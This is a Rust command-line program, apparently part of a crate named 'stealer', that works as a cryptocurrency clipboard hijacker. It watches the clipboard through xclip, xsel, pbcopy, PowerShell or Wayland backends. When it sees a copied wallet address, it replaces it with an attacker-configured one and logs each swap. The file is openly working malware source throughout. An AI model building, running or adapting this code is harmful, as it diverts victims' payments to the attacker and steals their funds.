//! Clipboard address monitor: detects a copied crypto address and swaps in ours.

use std::path::PathBuf;

use clap::{Parser, ValueEnum};
use stealer::clip::{self, ClipError, Clipboard, CommandClipboard, Config, Event, FileClipboard};

#[derive(Copy, Clone, Debug, ValueEnum)]
enum Backend {
    Auto,
    File,
    Wl,
    Xclip,
    Xsel,
    Pbcopy,
    Powershell,
}

#[derive(Parser, Debug)]
#[command(about = "Replace copied crypto wallet addresses with configured ones")]
struct Cli {
    /// State directory holding `clip.json` and `clipwatch.log`.
    #[arg(long, default_value = ".agent-fleet")]
    state: PathBuf,
    /// Clipboard backend.
    #[arg(long, value_enum, default_value_t = Backend::Auto)]
    backend: Backend,
    /// Poll once and exit.
    #[arg(long)]
    once: bool,
    /// Poll interval in milliseconds (overrides clip.json).
    #[arg(long)]
    interval_ms: Option<u64>,
    /// Set a replacement, e.g. `--set evm=0xabc...`; repeatable.
    #[arg(long = "set")]
    set: Vec<String>,
}

fn main() {
    let cli = Cli::parse();
    let state = cli.state;
    if let Err(error) = std::fs::create_dir_all(&state) {
        eprintln!("clipwatch: {}: {error}", state.display());
        std::process::exit(2);
    }
    let config_path = state.join("clip.json");
    let mut config = match Config::load(&config_path) {
        Ok(config) => config,
        Err(error) => {
            eprintln!("clipwatch: {error}");
            std::process::exit(2);
        }
    };
    for pair in &cli.set {
        let Some((chain, address)) = pair.split_once('=') else {
            eprintln!("clipwatch: --set expects chain=address, got {pair}");
            std::process::exit(2);
        };
        config
            .addresses
            .insert(chain.trim().to_owned(), address.trim().to_owned());
    }
    if !cli.set.is_empty() {
        let _ = std::fs::write(
            &config_path,
            serde_json::to_vec_pretty(&config).unwrap_or_default(),
        );
    }
    if let Some(interval) = cli.interval_ms {
        config.interval_ms = interval.max(50);
    }
    if config.addresses.is_empty() {
        eprintln!(
            "clipwatch: no addresses configured (use --set or {})",
            config_path.display()
        );
        std::process::exit(2);
    }

    let mut clipboard: Box<dyn Clipboard> = match cli.backend {
        Backend::File => Box::new(FileClipboard::new(state.join("clipboard.txt"))),
        Backend::Auto => match CommandClipboard::auto() {
            Ok(backend) => Box::new(backend),
            Err(error) => {
                eprintln!("clipwatch: {error}");
                std::process::exit(2);
            }
        },
        other => {
            let name = match other {
                Backend::Wl => "wl",
                Backend::Xclip => "xclip",
                Backend::Xsel => "xsel",
                Backend::Pbcopy => "pbcopy",
                Backend::Powershell => "powershell",
                _ => unreachable!(),
            };
            match CommandClipboard::named(name) {
                Some(backend) => Box::new(backend),
                None => {
                    eprintln!("clipwatch: unknown backend {name}");
                    std::process::exit(2);
                }
            }
        }
    };

    let log = state.join("clipwatch.log");
    let result = clip::watch(
        &mut clipboard,
        &config,
        cli.once.then_some(1),
        |event: Event| {
            stealer::log_line(
                &log,
                &serde_json::to_value(&event).unwrap_or_else(|_| serde_json::json!({})),
            );
        },
    );
    if let Err(error) = result {
        if matches!(error, ClipError::Unavailable) {
            eprintln!("clipwatch: {error}");
            std::process::exit(2);
        }
    }
}
